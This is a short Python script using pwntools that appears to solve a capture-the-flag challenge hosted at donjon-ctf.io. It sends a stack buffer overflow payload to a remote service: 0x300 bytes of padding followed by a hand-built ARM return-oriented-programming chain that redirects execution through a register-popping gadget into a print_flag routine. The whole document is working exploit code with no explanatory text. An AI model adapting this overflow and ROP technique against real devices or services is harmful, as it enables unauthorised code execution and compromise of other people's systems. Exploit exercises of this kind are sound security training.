from pwn import *

def recvuntil(bytes_str):
    print("< " + conn.recvuntil(bytes_str).decode("utf-8"))

#port: one value between 8001 and 8010
port = 8004
conn = remote('picohsm.donjon-ctf.io', port)
recvuntil(b'15 seconds...\n')

gadget_pop_R3_R4_R5_PC = p32(0x08000226 + 1)  # POP {R3-R5,PC}
print_flag = p32(0x0800040a + 1)              # print_flag address
R4 = 0xe1001fd8
R4_adjusted = 0xe1001fd8 + 0x4*8         # socket address
garbage = p32(0)
socket = p32(0xe1000010)


s = b'a'*0x300 + p32(R4) + gadget_pop_R3_R4_R5_PC                 #1
s += socket + p32(0) + garbage + gadget_pop_R3_R4_R5_PC           #2
s += garbage + p32(R4_adjusted) + garbage + print_flag            #3
s += socket + p32(0)                                              #4

conn.send(s)

print(conn.recvline().decode("utf-8"))
print(conn.recvall(timeout=2).decode("utf-8"))